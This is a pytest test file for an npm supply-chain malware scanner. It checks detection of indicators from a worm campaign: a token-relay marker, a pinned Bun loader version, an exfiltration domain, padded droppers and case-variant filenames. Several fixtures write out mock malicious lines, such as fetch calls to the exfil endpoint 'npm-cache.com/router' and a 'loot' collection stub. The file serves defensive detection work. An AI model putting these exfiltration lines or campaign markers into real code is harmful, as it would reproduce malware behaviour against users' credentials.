"""Security-researcher audit tests for Shai-Hulud/ChainDrop IOC coverage.

Verifies the detection gaps closed during the correctness audit:

1. The token-relay marker (``IfYouBlockThisAPIKeyItWillCrashTheLiveProduction…``)
   is data-backed AND actually detected in file content (it was previously
   present in signatures.json but never used by any detection code).
2. The Bun loader version signal (``bun-v1.3.13``) is detected in content and
   in temp-dir artifact filenames (was data-only before).
3. The live exfil endpoint domain (``npm-cache.com``) is detected from the
   defanged data form (``npm-cache[.]com``).
4. Filename signals match case-insensitively (Windows/macOS filesystems).
5. Persistence/process/systemd fix text warns to remove the gh-token-monitor
   watcher BEFORE rotating tokens (dead-man's switch ordering).
"""
import json
from pathlib import Path

import pytest

import npm_shield.signatures as sig_mod
from npm_shield.engine import Scanner
from npm_shield.persistence import PersistenceHunter
from npm_shield.signatures import SignatureMatcher

#: The full marker as observed in the wild (data/ stores a prefix of it).
FULL_TOKEN_MARKER = (
    "IfYouBlockThisAPIKeyItWillCrashTheLiveProduction"
    "ServersOfAllThirdPartyClients"
)
BUN_SIGNAL = "bun-v1.3.13"
EXFIL_LIVE = "npm-cache.com"


# ---------------------------------------------------------------------------
# Content-marker detection (token relay marker / bun signal / exfil domain)
# ---------------------------------------------------------------------------


def test_token_relay_marker_property(matcher):
    """The token-relay marker from signatures.json is exposed and is a
    prefix of the full marker observed in the wild."""
    marker = matcher.token_relay_marker
    assert marker
    assert FULL_TOKEN_MARKER.startswith(marker)


def test_match_content_markers_token_marker_full_string(matcher, tmp_path):
    """A file containing the FULL real-world marker is flagged critical —
    the stored prefix form matches the longer marker seen in the wild."""
    f = tmp_path / "deploy.yml"
    f.write_text("# %s\nexample: run" % FULL_TOKEN_MARKER)
    hits = matcher.match_content_markers(f)
    assert len(hits) == 1
    assert hits[0]["severity"] == "critical"
    assert hits[0]["category"] == "content_marker"
    assert matcher.token_relay_marker in hits[0]["pattern"]


def test_match_content_markers_bun_version(matcher, tmp_path):
    """A loader variant embedding the pinned Bun version is flagged."""
    f = tmp_path / "setup.mjs"
    f.write_text(
        "const url = 'https://github.com/oven-sh/bun/releases/download/"
        "%s/bun-linux-x64.zip';" % BUN_SIGNAL
    )
    hits = matcher.match_content_markers(f)
    assert any(h["severity"] == "medium" for h in hits)
    assert any(BUN_SIGNAL in h["pattern"] for h in hits)


def test_match_content_markers_exfil_endpoint_live_domain(matcher, tmp_path):
    """The defanged data form (npm-cache[.]com) detects the live domain
    (npm-cache.com) used in malware code."""
    f = tmp_path / "harvester.js"
    f.write_text("fetch('https://%s/router');" % EXFIL_LIVE)
    hits = matcher.match_content_markers(f)
    assert any(h["severity"] == "high" for h in hits)
    assert any(EXFIL_LIVE in h["pattern"] for h in hits)
    # The defanged string alone (research notes) does not fire.
    notes = tmp_path / "notes.txt"
    notes.write_text("endpoint: npm-cache[.]com")
    assert matcher.match_content_markers(notes) == []


def test_match_content_markers_clean(matcher, tmp_path):
    """Benign files produce no content-marker findings."""
    f = tmp_path / "index.js"
    f.write_text("console.log('hello');")
    assert matcher.match_content_markers(f) == []
    assert matcher.match_content_markers(tmp_path / "nope.js") == []


def test_match_content_markers_size_gate(matcher, tmp_path):
    """Padded files > MAX_MARKER_FILE_SIZE are STILL content-scanned.

    Regression test for size-evasion: an attacker can rename a dropper and
    pad it past the old skip threshold; the marker must still be caught via
    the chunked reader (overlapping chunks preserve substring search).
    """
    big = tmp_path / "big.js"
    # Marker in the middle, ~1.5MB junk around it
    junk = b"x" * (768 * 1024)
    big.write_bytes(junk + (FULL_TOKEN_MARKER + "\n").encode() + junk)
    assert big.stat().st_size > 1024 * 1024
    findings = matcher.match_content_markers(big)
    assert findings, "padded file evaded content-marker detection"
    assert findings[0]["severity"] == "critical"


# ---------------------------------------------------------------------------
# Case sensitivity of filename signals (Windows/macOS false-negative risk)
#
# Design: signal names match case-insensitively on case-insensitive
# filesystems (win32/darwin) and exactly on Linux, where casing variants
# are distinct files. The platform flag is monkeypatched here so both
# branches are exercised on any host.
# ---------------------------------------------------------------------------


def test_is_signal_name_exact_everywhere(matcher):
    """Exact signal names always match, whatever the platform flag."""
    assert matcher.is_signal_name("Math_Symbol.js")
    assert matcher.is_signal_name("setup.mjs")
    assert not matcher.is_signal_name("index.js")
    assert not matcher.is_signal_name("")


def test_is_signal_name_case_variants_only_on_ci_fs(matcher, monkeypatch):
    """Casing variants match only when the filesystem is case-insensitive."""
    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", False)  # Linux
    assert not matcher.is_signal_name("MATH_SYMBOL.JS")
    assert not matcher.is_signal_name("Setup.MJS")

    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", True)  # win32/darwin
    assert matcher.is_signal_name("MATH_SYMBOL.JS")
    assert matcher.is_signal_name("math_symbol.js")
    assert matcher.is_signal_name("Setup.MJS")


def test_match_file_case_variant_name_only(matcher, tmp_path, monkeypatch):
    """On a case-insensitive FS a case-variant signal name is flagged high."""
    f = tmp_path / "SETUP.MJS"
    f.write_bytes(b"x" * 42)

    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", True)
    hit = matcher.match_file(f)
    assert hit is not None
    assert hit["severity"] == "high"
    assert hit["category"] == "file_name_signal"

    # Linux-exact: the same file is a distinct name -> no signal match.
    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", False)
    assert matcher.match_file(f) is None


def test_match_file_case_variant_name_and_size(matcher, tmp_path, monkeypatch):
    """Case-variant name + known size is flagged critical on CI filesystems."""
    f = tmp_path / "math_symbol.js"
    f.write_bytes(b"\x00" * 727680)  # stage-2 harvester size

    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", True)
    hit = matcher.match_file(f)
    assert hit is not None
    assert hit["severity"] == "critical"
    assert hit["category"] == "file_name_size"


def test_scan_project_case_variant_signal(tmp_path, scanner, monkeypatch):
    """A project scan catches case-variant signal files on CI filesystems."""
    nm = tmp_path / "node_modules" / "evil-pkg"
    nm.mkdir(parents=True)
    (nm / "Setup.MJS").write_bytes(b"x" * 42)

    monkeypatch.setattr(sig_mod, "_CASE_INSENSITIVE_FS", True)
    result = scanner.scan(tmp_path)
    assert any(f.category == "file_name_signal" for f in result.findings)


# ---------------------------------------------------------------------------
# Engine wiring: markers in workflows and unknown node_modules variants
# ---------------------------------------------------------------------------


def test_scan_project_detects_workflow_marker(tmp_path, scanner):
    """A .github/workflows/*.yml file containing the token marker is caught."""
    wf = tmp_path / ".github" / "workflows" / "deploy.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text(
        "name: deploy\non: push\njobs:\n  run:\n"
        "    env:\n      GH_TOKEN: ${{ secrets.GH_TOKEN }}\n"
        "    # %s\n" % FULL_TOKEN_MARKER
    )
    result = scanner.scan(tmp_path)
    hits = [
        f
        for f in result.findings
        if f.category == "content_marker" and f.severity == "critical"
    ]
    assert hits
    assert str(wf) in (h.file_path or "" for h in hits)


def test_scan_project_detects_marker_in_node_modules_variant(tmp_path, scanner):
    """An unknown-named JS file in node_modules embedding the token marker
    is caught even though its name is not a signal (variant detection)."""
    evil = tmp_path / "node_modules" / "random-pkg" / "obfuscated-9f2a.js"
    evil.parent.mkdir(parents=True)
    evil.write_text(
        "const marker = '%s';\nconst loot = collect();" % FULL_TOKEN_MARKER
    )
    result = scanner.scan(tmp_path)
    hits = [
        f for f in result.findings if f.category == "content_marker"
    ]
    assert hits
    assert any(str(evil) in (h.file_path or "") for h in hits)


def test_scan_workflow_marker_clean(tmp_path, scanner):
    """A benign .github/workflows file produces no finding."""
    wf = tmp_path / ".github" / "workflows" / "ci.yml"
    wf.parent.mkdir(parents=True)
    wf.write_text("name: ci\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n")
    result = scanner.scan(tmp_path)
    assert not any(f.category == "content_marker" for f in result.findings)


# ---------------------------------------------------------------------------
# Dead-man's switch ordering in remediation guidance
# ---------------------------------------------------------------------------


def test_persistence_fix_warns_deadman_switch_ordering(monkeypatch, persistence_dir):
    """The persistence fix must warn to remove the watcher BEFORE rotating
    tokens — rotating first detonates the dead-man's switch."""
    monkeypatch.setenv("HOME", str(persistence_dir))
    findings = PersistenceHunter().hunt()
    fixes = [
        (f.fix or "").lower()
        for f in findings
        if "gh-token-monitor" in ((f.message or "") + (f.file_path or ""))
    ]
    assert fixes, "expected a gh-token-monitor persistence finding"
    text = fixes[0]
    assert "first" in text and "then" in text
    assert "before" in text or "then rotate" in text
    assert "dead-man" in text or "dead man" in text


def test_check_temp_dirs_bun_version_artifact(monkeypatch, tmp_path):
    """A bun-dl-* temp dir containing the pinned Bun archive is flagged
    high (stronger than the dir-name-only medium finding)."""
    parent = tmp_path / "tmp"
    dl = parent / "bun-dl-8f2a1"
    dl.mkdir(parents=True)
    (dl / "bun-v1.3.13-linux-x64.zip").write_bytes(b"zip")
    monkeypatch.setenv("TMPDIR", str(parent))
    findings = PersistenceHunter(home=str(tmp_path)).check_temp_dirs()
    assert any(f.category == "bun_artifact" and f.severity == "high" for f in findings)
    assert any(
        f.category == "temp_artifact" and f.severity == "medium" for f in findings
    )


def test_renamed_variant_root_js_detected(scanner, tmp_path):
    """A renamed dropper at the project root (innocuous name) is caught by
    content-marker scan — regression test for the root-level JS gap."""
    (tmp_path / "util.js").write_text(
        'const x = "IfYouBlockThisAPIKeyItWillCrashTheLiveProduction";\n'
        'fetch("https://npm-cache.com/router");\n'
    )
    result = scanner.scan(str(tmp_path))
    marker_findings = [f for f in result.findings if f.category == "content_marker"]
    assert marker_findings
    # Token-relay marker detected
    assert any("token-relay" in (f.message or "") for f in marker_findings)
    # Exfil endpoint detected (different finding or same)
    assert any("exfil" in (f.message or "").lower() for f in marker_findings)


def test_datadog_c2_marker_detected(matcher, tmp_path):
    """The Datadog-verified Ethereum C2 fallback markers are detected in
    unknown/renamed variants — regression test for the new content markers."""
    f = tmp_path / "mystery.js"
    f.write_text('const a = "thebeautifulmarchoftime";')
    hits = matcher.match_content_markers(f)
    assert hits
    assert any("campaign marker" in (h.get("message") or "") for h in hits)
    assert all(h["severity"] == "critical" for h in hits)
